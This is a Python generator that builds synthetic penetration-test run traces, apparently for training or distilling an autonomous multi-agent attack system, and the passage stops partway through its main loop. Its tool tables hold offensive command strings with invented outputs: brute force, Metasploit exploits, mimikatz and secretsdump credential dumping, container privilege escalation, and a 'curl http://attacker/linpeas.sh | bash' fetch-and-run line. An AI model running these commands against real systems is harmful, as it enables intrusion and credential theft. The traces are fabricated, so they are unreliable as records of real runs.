#!/usr/bin/env python3
"""Generate realistic synthetic run traces (JSONL) for distillation prep.

Produces replayer-compatible JSONL files that mimic real Ariaska runs:
  - Phase progression (RECON → … → CLOSEOUT)
  - Realistic tool usage, outputs, failures, pivots
  - Anti-repeat loops, evidence-gate dead-ends, credential discovery
  - Deterministic with --seed

Usage:
    python -m scripts.distill_prep.generate_synthetic_traces \\
        --runs 200 --seed 42 --outdir data/distill_prep/synthetic_traces
"""
from __future__ import annotations

import argparse
import hashlib
import json
import logging
import os
import random
import sys
import time
from dataclasses import asdict
from pathlib import Path
from typing import Any, Dict, List, Optional, Set, Tuple

logger = logging.getLogger("ariaska.distill_prep.generate_synthetic_traces")

# ---------------------------------------------------------------------------
# Scenario profiles
# ---------------------------------------------------------------------------

_EASY_SERVICES = ["http", "ssh", "ftp"]
_MEDIUM_SERVICES = ["http", "ssh", "smb", "mysql", "ftp"]
_HARD_SERVICES = ["http", "https", "ssh", "smb", "ldap", "dns", "mysql", "winrm"]

_EASY_PORTS = [22, 80, 21]
_MEDIUM_PORTS = [22, 80, 445, 3306, 21, 139]
_HARD_PORTS = [22, 80, 443, 445, 389, 53, 3306, 5985, 8080, 135]

DIFFICULTY_PROFILES = {
    "easy": {
        "services": _EASY_SERVICES,
        "ports": _EASY_PORTS,
        "step_range": (30, 60),
        "success_prob": 0.7,
        "cred_prob": 0.5,
        "flag_prob": 0.4,
        "max_phase_idx": 5,
    },
    "medium": {
        "services": _MEDIUM_SERVICES,
        "ports": _MEDIUM_PORTS,
        "step_range": (50, 90),
        "success_prob": 0.45,
        "cred_prob": 0.4,
        "flag_prob": 0.25,
        "max_phase_idx": 6,
    },
    "hard": {
        "services": _HARD_SERVICES,
        "ports": _HARD_PORTS,
        "step_range": (70, 120),
        "success_prob": 0.2,
        "cred_prob": 0.3,
        "flag_prob": 0.15,
        "max_phase_idx": 7,
    },
}

# ---------------------------------------------------------------------------
# Tool repertoire per phase (realistic pentest flow)
# ---------------------------------------------------------------------------

PHASE_TOOLS: Dict[str, List[Dict[str, Any]]] = {
    "RECON": [
        {
            "family": "nmap",
            "cmd": "nmap -sC -sV -oN scan.txt {ip}",
            "template": "nmap_service_version",
            "outputs": [
                "PORT   STATE SERVICE VERSION\n22/tcp open  ssh     OpenSSH 7.6p1\n80/tcp open  http    Apache/2.4.29",
                "PORT   STATE SERVICE VERSION\n21/tcp open  ftp     vsftpd 2.3.4\n22/tcp open  ssh     OpenSSH 4.7p1\n80/tcp open  http    Apache/2.2.8",
                "PORT    STATE SERVICE  VERSION\n80/tcp  open  http     nginx 1.14\n443/tcp open  https    nginx 1.14\n22/tcp  open  ssh      OpenSSH 8.2",
            ],
        },
        {
            "family": "nmap",
            "cmd": "nmap -p- --min-rate 5000 {ip}",
            "template": "nmap_full_tcp",
            "outputs": [
                "PORT      STATE SERVICE\n22/tcp    open  ssh\n80/tcp    open  http\n3306/tcp  open  mysql\n8080/tcp  open  http-proxy",
                "PORT    STATE SERVICE\n21/tcp  open  ftp\n22/tcp  open  ssh\n445/tcp open  microsoft-ds",
            ],
        },
        {
            "family": "masscan",
            "cmd": "masscan -p1-65535 --rate=1000 {ip}",
            "template": "masscan_full",
            "outputs": [
                "Discovered open port 22/tcp on {ip}\nDiscovered open port 80/tcp on {ip}\nDiscovered open port 3306/tcp on {ip}",
                "Discovered open port 21/tcp on {ip}\nDiscovered open port 445/tcp on {ip}\nDiscovered open port 8080/tcp on {ip}",
                "Discovered open port 80/tcp on {ip}\nDiscovered open port 443/tcp on {ip}\nDiscovered open port 8443/tcp on {ip}",
            ],
        },
        {
            "family": "whatweb",
            "cmd": "whatweb http://{ip}",
            "template": "whatweb",
            "outputs": [
                "http://{ip} [200] Apache[2.4.29], PHP[7.2], WordPress[5.0]",
                "http://{ip} [200] nginx, jQuery, Bootstrap",
            ],
        },
        {
            "family": "curl",
            "cmd": "curl -I http://{ip}",
            "template": "curl_headers",
            "outputs": [
                "HTTP/1.1 200 OK\nServer: Apache/2.4.29\nX-Powered-By: PHP/7.2",
                "HTTP/1.1 302 Found\nLocation: /login\nServer: nginx/1.14",
            ],
        },
    ],
    "ENUMERATION": [
        {
            "family": "gobuster",
            "cmd": "gobuster dir -u http://{ip} -w /usr/share/wordlists/dirb/common.txt",
            "template": "gobuster_dir",
            "outputs": [
                "/admin (Status: 200)\n/uploads (Status: 301)\n/config (Status: 403)\n/robots.txt (Status: 200)",
                "/login (Status: 200)\n/api (Status: 301)\n/backup (Status: 403)",
                "/wp-admin (Status: 302)\n/wp-content (Status: 200)\n/wp-includes (Status: 200)",
            ],
        },
        {
            "family": "ffuf",
            "cmd": "ffuf -u http://{ip}/FUZZ -w /usr/share/seclists/Discovery/Web-Content/common.txt",
            "template": "ffuf_dir",
            "outputs": [
                "admin                   [Status: 200, Size: 1234]\nuploads                 [Status: 301, Size: 0]\nrobots.txt              [Status: 200, Size: 68]",
                "login                   [Status: 200, Size: 3456]\napi                     [Status: 301, Size: 0]\n.htaccess               [Status: 403, Size: 277]",
                "wp-login.php            [Status: 200, Size: 5678]\nwp-admin                [Status: 302, Size: 0]\nxmlrpc.php              [Status: 405, Size: 42]",
            ],
        },
        {
            "family": "feroxbuster",
            "cmd": "feroxbuster -u http://{ip} -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt",
            "template": "feroxbuster_dir",
            "outputs": [
                "200      GET      120l      340w     4523c http://{ip}/admin\n301      GET        9l       28w      313c http://{ip}/uploads\n200      GET       15l       40w      892c http://{ip}/config.php",
                "200      GET       45l      128w     2345c http://{ip}/login\n301      GET        9l       28w      311c http://{ip}/api\n403      GET        9l       28w      277c http://{ip}/.env",
            ],
        },
        {
            "family": "wfuzz",
            "cmd": "wfuzz -c -z file,/usr/share/wordlists/dirb/common.txt --hc 404 http://{ip}/FUZZ",
            "template": "wfuzz_dir",
            "outputs": [
                "000000001:   200        120 L    340 W   4523 Ch  \"admin\"\n000000045:   301        9 L      28 W    313 Ch  \"uploads\"\n000000112:   200        15 L     40 W    892 Ch  \"login\"",
                "000000023:   200        45 L     128 W   2345 Ch  \"api\"\n000000089:   403        9 L      28 W    277 Ch  \".htpasswd\"\n000000134:   200        22 L     67 W    1456 Ch \"backup\"",
            ],
        },
        {
            "family": "nikto",
            "cmd": "nikto -h http://{ip}",
            "template": "nikto_scan",
            "outputs": [
                "- /admin/: Directory indexing found\n- /config.php: PHP Config file found\n- Server: Apache/2.4.29",
                "- OSVDB-3092: /phpmyadmin/: phpMyAdmin directory found\n- Server leaks inodes via ETags",
            ],
        },
        {
            "family": "enum4linux",
            "cmd": "enum4linux -a {ip}",
            "template": "enum4linux_full",
            "outputs": [
                "user:[admin] rid:[0x3e8]\nuser:[guest] rid:[0x1f5]\nuser:[service] rid:[0x3e9]",
                "Sharename  Type  Comment\n-------  ----  -------\nIPC$     IPC   IPC Service\nshare    Disk  Public share",
            ],
        },
        {
            "family": "smbclient",
            "cmd": "smbclient -L //{ip} -N",
            "template": "smbclient_list",
            "outputs": [
                "Sharename  Type  Comment\n---------  ----  -------\nIPC$       IPC   IPC Service\nprint$     Disk  Printer Drivers\nshare      Disk",
                "NT_STATUS_ACCESS_DENIED",
            ],
        },
        {
            "family": "smbmap",
            "cmd": "smbmap -H {ip}",
            "template": "smbmap_enum",
            "outputs": [
                "[+] IP: {ip}:445\tName: target\n\tDisk\tPermissions\tComment\n\t----\t-----------\t-------\n\tIPC$\tNO ACCESS\tIPC Service\n\tshare\tREAD ONLY\tPublic share\n\tbackups\tREAD, WRITE\tBackup files",
                "[+] IP: {ip}:445\tName: target\n\tDisk\tPermissions\tComment\n\t----\t-----------\t-------\n\tprint$\tNO ACCESS\tPrinter Drivers\n\tC$\tNO ACCESS\tDefault share",
                "[!] Authentication error on {ip}",
            ],
        },
        {
            "family": "rpcclient",
            "cmd": "rpcclient -U '' -N {ip}",
            "template": "rpcclient_null",
            "outputs": [
                "rpcclient $> enumdomusers\nuser:[admin] rid:[0x1f4]\nuser:[guest] rid:[0x1f5]\nuser:[svc_backup] rid:[0x44f]",
                "rpcclient $> srvinfo\n\tTARGET\tWk Sv PrQ Unx NT SNT Samba 4.11.6\n\tplatform_id\t:\t500\n\tos version\t:\t6.1",
                "Cannot connect to server. Error: NT_STATUS_ACCESS_DENIED",
            ],
        },
        {
            "family": "dig",
            "cmd": "dig @{ip} ANY target.local",
            "template": "dig_any",
            "outputs": [
                ";; ANSWER SECTION:\ntarget.local.\t600\tIN\tA\t10.10.10.1\ntarget.local.\t600\tIN\tMX\t10 mail.target.local.\ntarget.local.\t600\tIN\tNS\tns1.target.local.",
                ";; ANSWER SECTION:\ncorp.local.\t3600\tIN\tSOA\tdc01.corp.local. hostmaster.corp.local. 42 900 600 86400 3600",
                ";; connection timed out; no servers could be reached",
            ],
        },
        {
            "family": "dnsrecon",
            "cmd": "dnsrecon -d target.local -n {ip}",
            "template": "dnsrecon_std",
            "outputs": [
                "[*] Performing General Enumeration\n[*] DNSSEC is not configured\n[*]\tA target.local 10.10.10.1\n[*]\tNS ns1.target.local 10.10.10.1\n[*]\tMX mail.target.local 10.10.10.5",
                "[*] Performing General Enumeration\n[*]\tSOA dc01.corp.local 10.10.10.1\n[*]\tNS dc01.corp.local 10.10.10.1\n[*]\tA dc01.corp.local 10.10.10.1",
            ],
        },
        {
            "family": "snmpwalk",
            "cmd": "snmpwalk -v2c -c public {ip}",
            "template": "snmpwalk_public",
            "outputs": [
                "SNMPv2-MIB::sysDescr.0 = STRING: Linux target 5.4.0-42-generic #46-Ubuntu SMP\nSNMPv2-MIB::sysName.0 = STRING: target\nSNMPv2-SMI::enterprises.674.10893.1.20 = STRING: admin",
                "SNMPv2-MIB::sysDescr.0 = STRING: Hardware: Intel64 - Software: Windows Version 6.3\nSNMPv2-MIB::sysName.0 = STRING: DC01",
                "Timeout: No Response from {ip}",
            ],
        },
        {
            "family": "showmount",
            "cmd": "showmount -e {ip}",
            "template": "showmount_exports",
            "outputs": [
                "Export list for {ip}:\n/home/backup   *\n/var/nfs       10.10.10.0/24",
                "Export list for {ip}:\n/tmp           (everyone)",
                "clnt_create: RPC: Program not registered",
            ],
        },
        {
            "family": "ftp",
            "cmd": "ftp {ip}",
            "template": "ftp_anonymous",
            "outputs": [
                "230 Login successful.\nftp> ls\n-rw-r--r--    1 0  0   1024 note.txt\n-rw-r--r--    1 0  0   4096 backup.tar.gz",
                "530 Login incorrect.",
            ],
        },
        {
            "family": "ssh_audit",
            "cmd": "ssh-audit {ip}",
            "template": "ssh_audit",
            "outputs": [
                "(gen) banner: SSH-2.0-OpenSSH_7.6p1\n(gen) software: OpenSSH 7.6p1\n(kex) diffie-hellman-group14-sha256",
            ],
        },
    ],
    "EXPLOITATION": [
        {
            "family": "hydra",
            "cmd": "hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://{ip}",
            "template": "hydra_ssh",
            "outputs": [
                "[22][ssh] host: {ip}   login: admin   password: password123",
                "[STATUS] 50 tries, 0 successes",
                "[STATUS] attack finished, 0 valid passwords found",
            ],
        },
        {
            "family": "sqlmap",
            "cmd": "sqlmap -u 'http://{ip}/page?id=1' --batch --dbs",
            "template": "sqlmap_get",
            "outputs": [
                "Parameter: id (GET)\n  Type: UNION query\n  Payload: id=1 UNION SELECT 1,2,3--\navailable databases:\n[*] information_schema\n[*] webapp_db",
                "[WARNING] GET parameter 'id' does not seem to be injectable",
            ],
        },
        {
            "family": "msfconsole",
            "cmd": "msfconsole -q -x 'use exploit/multi/http/apache_mod_cgi_bash_env_exec; set RHOSTS {ip}; run'",
            "template": "msfconsole_shellshock",
            "outputs": [
                "[*] Started reverse TCP handler on 10.10.14.1:4444\n[*] {ip}:80 - Sending exploit...\n[*] Command shell session 1 opened\nuid=33(www-data) gid=33(www-data)",
                "[*] Started reverse TCP handler on 10.10.14.1:4444\n[-] Exploit aborted: target not vulnerable",
                "[-] {ip}:80 - Exploit failed: Connection refused",
            ],
        },
        {
            "family": "msfconsole",
            "cmd": "msfconsole -q -x 'use exploit/unix/ftp/vsftpd_234_backdoor; set RHOSTS {ip}; run'",
            "template": "msfconsole_vsftpd",
            "outputs": [
                "[*] {ip}:21 - Banner: 220 (vsFTPd 2.3.4)\n[*] {ip}:21 - USER: 331 Please specify the password.\n[+] {ip}:21 - Backdoor service has been spawned\n[+] {ip}:21 - UID: uid=0(root) gid=0(root)",
                "[*] {ip}:21 - Banner: 220 (vsFTPd 3.0.3)\n[-] {ip}:21 - Exploit failed: not vulnerable",
            ],
        },
        {
            "family": "exploit",
            "cmd": "python3 exploit.py {ip} 21",
            "template": "vsftpd_backdoor_nc",
            "outputs": [
                "Sending exploit payload...\nConnected to backdoor shell on port 6200\n$ id\nuid=0(root) gid=0(root)",
                "Connection refused. Target not vulnerable.",
                "Exploit failed: service patched",
            ],
        },
        {
            "family": "ssh",
            "cmd": "ssh admin@{ip}",
            "template": "ssh_login",
            "outputs": [
                "admin@target:~$ id\nuid=1000(admin) gid=1000(admin) groups=1000(admin)",
                "Permission denied (publickey,password).",
            ],
        },
        {
            "family": "impacket",
            "cmd": "impacket-psexec admin:password123@{ip}",
            "template": "impacket_psexec",
            "outputs": [
                "Impacket v0.10 - Copyright 2022\n[*] Requesting shares on {ip}...\n[*] Found writable share ADMIN$\nC:\\Windows\\system32>",
                "[-] SMB SessionError: STATUS_LOGON_FAILURE",
            ],
        },
        {
            "family": "crackmapexec",
            "cmd": "crackmapexec smb {ip} -u admin -p password123",
            "template": "crackmapexec_smb_bruteforce",
            "outputs": [
                "SMB  {ip}  445  TARGET  [+] admin:password123 (Pwn3d!)",
                "SMB  {ip}  445  TARGET  [-] admin:password123 STATUS_LOGON_FAILURE",
            ],
        },
    ],
    "PRIVILEGE_ESCALATION": [
        {
            "family": "linpeas",
            "cmd": "curl http://attacker/linpeas.sh | bash",
            "template": "linpeas_ms2",
            "outputs": [
                "╔══════════╣ SUID Binaries\n/usr/bin/python3.6\n/usr/bin/find\n/usr/bin/nmap",
                "╔══════════╣ Sudo version\nSudo version 1.8.21p2\n╔══════════╣ CVEs Check\nCVE-2021-3156 - Exploitable!",
            ],
        },
        {
            "family": "winpeas",
            "cmd": ".\\winPEASx64.exe",
            "template": "winpeas_run",
            "outputs": [
                "════════════════════════════════════╗\n║ Basic System Information           ║\n╚════════════════════════════════════╝\n  Hostname: TARGET\n  OS: Windows 10 Pro 19041\n\n════════════════════════════════════╗\n║ Interesting Services               ║\n╚════════════════════════════════════╝\n  Apache2.4(Apache2.4)[C:\\Apache24\\bin\\httpd.exe] - Auto - Running - isDotNet: No\n  Permissions: SERVICE_ALL_ACCESS",
                "════════════════════════════════════╗\n║ Modifiable Services                ║\n╚════════════════════════════════════╝\n  YOURSERVICE(YourService)[C:\\Program Files\\YourService\\svc.exe]\n  Permissions: SERVICE_ALL_ACCESS\n  YOU CAN MODIFY THIS SERVICE",
                "[!] No interesting privesc vectors found.",
            ],
        },
        {
            "family": "sudo",
            "cmd": "sudo -l",
            "template": "sudo_list",
            "outputs": [
                "(ALL) NOPASSWD: /usr/bin/vim\n(ALL) NOPASSWD: /usr/bin/python3",
                "User admin may run the following:\n(root) /usr/bin/less /var/log/*.log",
                "Sorry, user admin may not run sudo on target.",
            ],
        },
        {
            "family": "find_suid",
            "cmd": "find / -perm -4000 -type f 2>/dev/null",
            "template": "find_suid",
            "outputs": [
                "/usr/bin/passwd\n/usr/bin/su\n/usr/bin/python3.6\n/usr/bin/find",
                "/usr/bin/passwd\n/usr/bin/su\n/usr/bin/pkexec",
            ],
        },
        {
            "family": "python",
            "cmd": "python3 -c 'import os; os.setuid(0); os.system(\"/bin/bash\")'",
            "template": "docker_privesc",
            "outputs": [
                "root@target:~# id\nuid=0(root) gid=0(root) groups=0(root)",
                "Traceback: Operation not permitted",
            ],
        },
        {
            "family": "docker",
            "cmd": "docker run -v /:/mnt --rm -it alpine chroot /mnt sh",
            "template": "docker_privesc",
            "outputs": [
                "# id\nuid=0(root) gid=0(root) groups=0(root)\n# hostname\ntarget",
                "docker: permission denied while trying to connect to the Docker daemon socket",
                "docker: Got permission denied while trying to connect to the Docker daemon socket at unix:///var/run/docker.sock",
            ],
        },
        {
            "family": "lxd",
            "cmd": "lxc init ubuntu:16.04 privesc -c security.privileged=true && lxc config device add privesc mydevice disk source=/ path=/mnt/root && lxc start privesc && lxc exec privesc /bin/sh",
            "template": "lxd_privesc",
            "outputs": [
                "Creating privesc\nDevice mydevice added\n# id\nuid=0(root) gid=0(root)\n# cat /mnt/root/root/root.txt\nflag{lxd_privesc_root}",
                "Error: not found\nThe container could not be found",
                "Error: Permission denied, are you in the lxd group?",
            ],
        },
        {
            "family": "certipy",
            "cmd": "certipy find -u svc_user@corp.local -p 'Password1' -dc-ip {ip}",
            "template": "certipy_find",
            "outputs": [
                "[*] Finding certificate templates\n[*] Found 34 certificate templates\n[!] Vulnerable template: ESC1 - SubCA\n  Template Name: WebServer\n  Enrollment Rights: Authenticated Users\n  Extended Key Usage: Client Authentication",
                "[*] Finding certificate templates\n[*] Found 12 certificate templates\n[*] No vulnerable templates found",
            ],
        },
        {
            "family": "rubeus",
            "cmd": "Rubeus.exe kerberoast /outfile:hashes.txt",
            "template": "rubeus_kerberoast",
            "outputs": [
                "[*] Action: Kerberoasting\n[*] NOTICE: AES://  hash is used\n[*] Target User: svc_sql\n[*] Hash written to: hashes.txt\n\n$krb5tgs$23$*svc_sql$CORP.LOCAL$MSSQLSvc/db01.corp.local:1433*$a1b2c3d4...",
                "[*] Action: Kerberoasting\n[*] No users found with SPNs set",
                "[X] Error: Access Denied - cannot request TGS",
            ],
        },
    ],
    "LATERAL_MOVEMENT": [
        {
            "family": "chisel",
            "cmd": "chisel client {ip}:8000 R:socks",
            "template": "chisel_server",
            "outputs": [
                "client: Connected (Socks5 proxy on 127.0.0.1:1080)",
                "client: Connection failed: dial tcp: connection refused",
            ],
        },
        {
            "family": "ssh",
            "cmd": "ssh -i id_rsa user@10.10.10.2",
            "template": "ssh_login",
            "outputs": [
                "user@internal:~$ id\nuid=1001(user) gid=1001(user)",
                "Permission denied (publickey).",
            ],
        },
    ],
    "POST_EXPLOITATION": [
        {
            "family": "mimikatz",
            "cmd": "mimikatz.exe 'sekurlsa::logonpasswords'",
            "template": "mimikatz_logonpasswords",
            "outputs": [
                "Authentication Id : 0 ; 999\nmsv :\n [00000003] Primary\n * Username : Administrator\n * NTLM     : aad3b435b51404eeaad3b435b51404ee",
                "ERROR kuhl_m_sekurlsa_acquireLSA ; Handle on memory (0x00000005)",
            ],
        },
        {
            "family": "impacket",
            "cmd": "impacket-secretsdump admin:password@{ip}",
            "template": "impacket_secretsdump",
            "outputs": [
                "Administrator:500:aad3b435b514:31d6cfe0d16ae931b73c59d7e0c089c0:::\nGuest:501:aad3b435b514:31d6cfe0d16ae931b73c59d7e0c089c0:::",
                "[-] RemoteOperations failed: DCERPC Runtime Error",
            ],
        },
    ],
    "EXFILTRATION": [
        {
            "family": "nc",
            "cmd": "cat /root/root.txt",
            "template": "nc_exfil",
            "outputs": [
                "flag{a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4}",
                "cat: /root/root.txt: Permission denied",
            ],
        },
        {
            "family": "manual",
            "cmd": "cat /home/user/user.txt",
            "template": "nc_exfil",
            "outputs": [
                "flag{1234abcd5678efgh1234abcd5678efgh}",
                "cat: /home/user/user.txt: No such file or directory",
            ],
        },
    ],
    "CLOSEOUT": [
        {
            "family": "manual",
            "cmd": "rm -f /tmp/linpeas.sh /tmp/chisel",
            "template": "remove_uploaded_tools",
            "outputs": [
                "Cleanup complete.",
                "",
            ],
        },
        {
            "family": "manual",
            "cmd": "echo 'Engagement complete'",
            "template": "generate_report",
            "outputs": [
                "Report generated.",
            ],
        },
    ],
}

# Agents active per phase
PHASE_AGENTS: Dict[str, List[str]] = {
    "RECON": ["ScoutAgent", "ShadowAgent"],
    "ENUMERATION": ["ScoutAgent", "RedAgent", "ShadowAgent"],
    "EXPLOITATION": ["RedAgent", "ShadowAgent", "OrionAgent"],
    "PRIVILEGE_ESCALATION": ["RedAgent", "ShadowAgent"],
    "LATERAL_MOVEMENT": ["RedAgent", "ScoutAgent"],
    "POST_EXPLOITATION": ["RedAgent", "OrionAgent"],
    "EXFILTRATION": ["RedAgent", "ShadowAgent"],
    "CLOSEOUT": ["BlueAgent", "OrionAgent"],
}


# ---------------------------------------------------------------------------
# Discovery generators
# ---------------------------------------------------------------------------


def _gen_port_discovery(port: int) -> Dict[str, Any]:
    return {
        "discovery_type": "PORT",
        "value": str(port),
        "confidence": 1.0,
        "source_stage": "regex",
    }


def _gen_service_discovery(svc: str, port: int) -> Dict[str, Any]:
    return {
        "discovery_type": "SERVICE",
        "value": f"{svc}:{port}",
        "confidence": 0.95,
        "source_stage": "regex",
    }


def _gen_user_discovery(user: str) -> Dict[str, Any]:
    return {
        "discovery_type": "USER",
        "value": user,
        "confidence": 0.9,
        "source_stage": "regex",
    }


def _gen_cred_discovery(user: str, pwd: str) -> Dict[str, Any]:
    return {
        "discovery_type": "CREDENTIAL",
        "value": f"{user}:{pwd}",
        "confidence": 1.0,
        "source_stage": "regex",
    }


def _gen_shell_discovery() -> Dict[str, Any]:
    return {
        "discovery_type": "SHELL",
        "value": "user_shell",
        "confidence": 1.0,
        "source_stage": "regex",
    }


def _gen_root_shell_discovery() -> Dict[str, Any]:
    return {
        "discovery_type": "ROOT_SHELL",
        "value": "root_shell",
        "confidence": 1.0,
        "source_stage": "regex",
    }


def _gen_web_path_discovery(path: str) -> Dict[str, Any]:
    return {
        "discovery_type": "WEB_PATH",
        "value": path,
        "confidence": 0.9,
        "source_stage": "regex",
    }


def _gen_flag_discovery(flag_type: str, value: str) -> Dict[str, Any]:
    return {
        "discovery_type": "FLAG",
        "value": f"{flag_type}:{value}",
        "confidence": 1.0,
        "source_stage": "regex",
    }


def _gen_vuln_discovery(vuln: str) -> Dict[str, Any]:
    return {
        "discovery_type": "VULNERABILITY",
        "value": vuln,
        "confidence": 0.85,
        "source_stage": "regex",
    }


# ---------------------------------------------------------------------------
# Reward heuristic (conservative; mirrors reward_calculator patterns)
# ---------------------------------------------------------------------------

DISCOVERY_REWARDS: Dict[str, float] = {
    "PORT": 2.5,
    "SERVICE": 5.0,
    "VERSION": 6.5,
    "USER": 8.0,
    "HASH": 16.0,
    "CREDENTIAL": 20.0,
    "VULNERABILITY": 10.0,
    "CVE": 13.0,
    "SHELL": 40.0,
    "ROOT_SHELL": 80.0,
    "WEB_PATH": 3.0,
    "FLAG": 50.0,
    "SMB_SHARE": 4.0,
    "OS_INFO": 3.0,
    "HOSTNAME": 2.0,
}

PHASE_ADVANCE_REWARDS: Dict[str, float] = {
    "RECON": 0.0,
    "ENUMERATION": 5.0,
    "EXPLOITATION": 15.0,
    "PRIVILEGE_ESCALATION": 30.0,
    "LATERAL_MOVEMENT": 45.0,
    "POST_EXPLOITATION": 60.0,
    "EXFILTRATION": 75.0,
    "CLOSEOUT": 90.0,
}

_FAILURE_PENALTY = -2.0
_REPEAT_PENALTY = -3.0

# Decision source probabilities per step
_DECISION_SOURCE_WEIGHTS = {
    "ppo": 0.35,
    "playbook": 0.20,
    "registry": 0.15,
    "micro_chain": 0.10,
    "mentor": 0.08,
    "phase_guided": 0.05,
    "fallback": 0.05,
    "anti_repeat": 0.02,
}


def _pick_decision_source(rng: random.Random) -> str:
    sources = list(_DECISION_SOURCE_WEIGHTS.keys())
    weights = list(_DECISION_SOURCE_WEIGHTS.values())
    return rng.choices(sources, weights=weights, k=1)[0]


# ---------------------------------------------------------------------------
# Main generator
# ---------------------------------------------------------------------------


def _phase_index(phase: str) -> int:
    from scripts.distill_prep.trace_schema import PHASE_ORDER

    try:
        return PHASE_ORDER.index(phase)
    except ValueError:
        return 0


def generate_one_run(
    run_idx: int,
    difficulty: str,
    rng: random.Random,
    target_ip: str = "10.10.10.1",
) -> List[Dict[str, Any]]:
    """Generate a single synthetic run as a list of JSONL-ready dicts."""
    from scripts.distill_prep.trace_schema import (
        DISTILL_PREP_VERSION,
        PHASE_ORDER,
    )

    profile = DIFFICULTY_PROFILES[difficulty]
    n_steps = rng.randint(*profile["step_range"])
    episode_id = f"distill_run_{run_idx:04d}"

    lines: List[Dict[str, Any]] = []

    # Episode start
    lines.append(
        {
            "kind": "episode_start",
            "distill_prep_version": DISTILL_PREP_VERSION,
            "episode_id": episode_id,
            "episode_num": run_idx,
            "target_ip": target_ip,
            "difficulty": difficulty,
            "service_mix": ",".join(profile["services"]),
            "seed": rng.randint(0, 2**31),
        }
    )

    phase_idx = 0
    current_phase = PHASE_ORDER[phase_idx]
    episode_reward = 0.0
    discovered_ports: Set[int] = set()
    discovered_services: Set[str] = set()
    discovered_users: Set[str] = set()
    got_creds = False
    got_shell = False
    got_root = False
    got_user_flag = False
    got_root_flag = False
    highest_phase_idx = 0
    last_command = ""
    repeat_count = 0

    # Inject mandatory patterns:
    # - anti-repeat at step ~15-25% of total
    anti_repeat_step = rng.randint(max(3, n_steps // 5), max(5, n_steps // 3))
    # - dead-end pivot at step ~30-50%
    dead_end_step = rng.randint(max(8, n_steps // 3), max(12, n_steps // 2))
    # - credential discovery at step ~40-60% (if profile allows)
    cred_step = rng.randint(max(15, 2 * n_steps // 5), max(20, 3 * n_steps // 5))

    for step in range(n_steps):
        phase_before = current_phase
        step_reward = 0.0
        discoveries: List[Dict[str, Any]] = []
        is_wrong_move = False
        tactical_lesson = ""

        # Pick tool for current phase
        tools = PHASE_TOOLS.get(current_phase, PHASE_TOOLS["RECON"])
        tool = rng.choice(tools)
        cmd = tool["cmd"].replace("{ip}", target_ip)
        agent_name = rng.choice(PHASE_AGENTS.get(current_phase, ["RedAgent"]))

        # Anti-repeat scenario injection
        if step == anti_repeat_step:
            # Force repeat of last command
            cmd = last_command if last_command else cmd
            is_wrong_move = True
            tactical_lesson = "Repeated command detected — anti-repeat guard should trigger"
            step_reward += _REPEAT_PENALTY
            repeat_count += 1
        # Dead-end pivot scenario
        elif step == dead_end_step:
            # Use exploitation tool without prerequisites
            is_wrong_move = True
            tactical_lesson = "Evidence gate reject — insufficient evidence for exploit"
            cmd = f"python3 exploit.py {target_ip} 9999"
            tool = {
                "family": "exploit",
                "template": "vsftpd_backdoor_nc",
                "outputs": ["Connection refused. Target not vulnerable."],
            }
            step_reward += _FAILURE_PENALTY
        else:
            # Normal step — generate discoveries based on phase
            if current_phase == "RECON" and len(discovered_ports) < len(
                profile["ports"]
            ):
                ports_to_discover = rng.sample(
                    [p for p in profile["ports"] if p not in discovered_ports],
                    min(
                        rng.randint(1, 3),
                        len(
                            [p for p in profile["ports"] if p not in discovered_ports]
                        ),
                    ),
                )
                for p in ports_to_discover:
                    discoveries.append(_gen_port_discovery(p))
                    discovered_ports.add(p)
                    step_reward += DISCOVERY_REWARDS["PORT"]

            elif current_phase == "ENUMERATION":
                if len(discovered_services) < len(profile["services"]):
                    for svc in profile["services"]:
                        if svc not in discovered_services and rng.random() < 0.4:
                            port = rng.choice(profile["ports"])
                            discoveries.append(_gen_service_discovery(svc, port))
                            discovered_services.add(svc)
                            step_reward += DISCOVERY_REWARDS["SERVICE"]
                            break
                if rng.random() < 0.15:
                    user = rng.choice(["admin", "user", "www-data", "service", "guest"])
                    if user not in discovered_users:
                        discoveries.append(_gen_user_discovery(user))
                        discovered_users.add(user)
                        step_reward += DISCOVERY_REWARDS["USER"]
                if rng.random() < 0.2:
                    path = rng.choice(
                        ["/admin", "/login", "/uploads", "/api", "/backup", "/config"]
                    )
                    discoveries.append(_gen_web_path_discovery(path))
                    step_reward += DISCOVERY_REWARDS["WEB_PATH"]

            elif current_phase == "EXPLOITATION":
                if step == cred_step and rng.random() < profile["cred_prob"]:
                    user = rng.choice(list(discovered_users) or ["admin"])
                    pwd = rng.choice(
                        ["password123", "admin", "root", "letmein", "toor"]
                    )
                    discoveries.append(_gen_cred_discovery(user, pwd))
                    got_creds = True
                    step_reward += DISCOVERY_REWARDS["CREDENTIAL"]
                if not got_shell and got_creds and rng.random() < 0.35:
                    discoveries.append(_gen_shell_discovery())
                    got_shell = True
                    step_reward += DISCOVERY_REWARDS["SHELL"]
                elif not got_creds and rng.random() < 0.3:
                    # Failed exploit attempt
                    is_wrong_move = True
                    tactical_lesson = "Exploit attempt without valid credentials"
                    step_reward += _FAILURE_PENALTY

            elif current_phase == "PRIVILEGE_ESCALATION":
                if got_shell and not got_root and rng.random() < 0.25:
                    discoveries.append(_gen_root_shell_discovery())
                    got_root = True
                    step_reward += DISCOVERY_REWARDS["ROOT_SHELL"]
                elif rng.random() < 0.15:
                    discoveries.append(_gen_vuln_discovery("SUID-python3"))
                    step_reward += DISCOVERY_REWARDS["VULNERABILITY"]
                elif rng.random() < 0.3:
                    is_wrong_move = True
                    tactical_lesson = "Privesc attempt failed — wrong vector"
                    step_reward += _FAILURE_PENALTY

            elif current_phase == "EXFILTRATION":
                if got_root and not got_root_flag and rng.random() < profile["flag_prob"]:
                    flag_val = hashlib.md5(
                        f"root_flag_{run_idx}".encode()
                    ).hexdigest()
                    discoveries.append(_gen_flag_discovery("root_flag", flag_val))
                    got_root_flag = True
                    step_reward += DISCOVERY_REWARDS["FLAG"]
                if got_shell and not got_user_flag and rng.random() < profile["flag_prob"]:
                    flag_val = hashlib.md5(
                        f"user_flag_{run_idx}".encode()
                    ).hexdigest()
                    discoveries.append(_gen_flag_discovery("user_flag", flag_val))
                    got_user_flag = True
                    step_reward += DISCOVERY_REWARDS["FLAG"]

        # Pick output
        output = rng.choice(tool.get("outputs", [""])).replace("{ip}", target_ip)

        # Decide source
        source = _pick_decision_source(rng)

        # Phase advancement logic
        phase_after = current_phase
        can_advance = False
